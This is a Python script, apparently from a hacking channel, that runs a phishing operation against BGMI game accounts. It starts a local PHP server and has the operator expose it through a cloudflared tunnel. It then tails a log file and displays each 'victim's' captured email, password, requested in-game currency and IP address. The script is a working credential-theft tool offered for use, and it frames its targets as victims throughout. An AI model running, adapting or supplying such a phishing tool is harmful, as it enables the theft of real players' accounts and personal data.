import os
import time
import threading
import pyfiglet
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.text import Text

console = Console()
LOG_FILE = "/data/data/com.termux/files/home/HCO-BGMI-PHISH/data.log"

def clear():
    os.system("clear")

def banner(text, color="bold green"):
    ascii_banner = pyfiglet.figlet_format(text)
    console.print(ascii_banner, style=color)

def intro():
    os.system("pkill php")
    clear()
    banner("HCO BGMI", "bold red")
    console.print(Panel("[bold yellow]Subscribe our YouTube Channel to use this tool![/]", style="bold magenta"))
    time.sleep(2)
    os.system("xdg-open https://youtube.com/@hackers_colony_tech")
    time.sleep(3)
    clear()
    banner("HCO BGMI", "bold green")
    console.print(Panel("[bold cyan]>> By ALI SABRI | Hackers Colony Official <<[/]"))
    console.print(Panel("Tool to Hack BGMI ID via Cloudflare Tunnel", style="bold green"))

def show_menu():
    console.print("\n[bold yellow][1][/bold yellow] Start BGMI Phishing")
    console.print("[bold red][2][/bold red] Exit")

def tail_log():
    """Live monitor the victim data log file"""
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    with open(LOG_FILE, "r") as f:
        f.seek(0, os.SEEK_END)  # move to end of file
        console.print("\n[bold magenta]⏳ Waiting for victims...[/bold magenta]\n")
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.5)
                continue
            if "Email:" in line:
                email = line.split("Email: ")[1].strip()
                password = f.readline().split("Password: ")[1].strip()
                uc = f.readline().split("UC: ")[1].strip()
                ip = f.readline().split("IP Address: ")[1].strip()
                console.print(Panel.fit(
                    f"[bold green]💀 Victim Captured![/bold green]\n\n"
                    f"[yellow]📧 Email:[/] {email}\n"
                    f"[red]🔑 Password:[/] {password}\n"
                    f"[cyan]💎 UC Requested:[/] {uc}\n"
                    f"[magenta]🌐 IP Address:[/] {ip}\n",
                    title="New Victim", border_style="bright_red"
                ))

def start_server():
    port = Prompt.ask("\n[bold green]Enter port[/bold green]", default="8080")
    console.print(f"\n[bold green][+] Starting PHP server at[/bold green] http://0.0.0.0:{port}")
    os.system(f"php -S 0.0.0.0:{port} &")
    time.sleep(2)

    # Start victim logger
    threading.Thread(target=tail_log, daemon=True).start()

    console.print(Panel.fit(
        f"[bold yellow]Now open another terminal and run this:[/bold yellow]\n\n"
        f"[bold magenta]cloudflared tunnel --url http://localhost:{port}[/bold magenta]\n\n"
        f"[green]Waiting for victim logs below...[/green]",
        title="Tunnel Instructions", border_style="bright_blue"
    ))

    # Keep the main thread alive
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            console.print("\n[bold red]Stopped by user. Exiting...[/bold red]")
            os.system("pkill php")
            break

def main():
    intro()
    while True:
        show_menu()
        choice = Prompt.ask("\n[bold blue]Enter your choice[/]", choices=["1", "2"], default="1")
        if choice == "1":
            start_server()
            break
        elif choice == "2":
            console.print("\n[bold red]Exiting... Bye Hacker![/bold red]")
            break

if __name__ == "__main__":
    main()
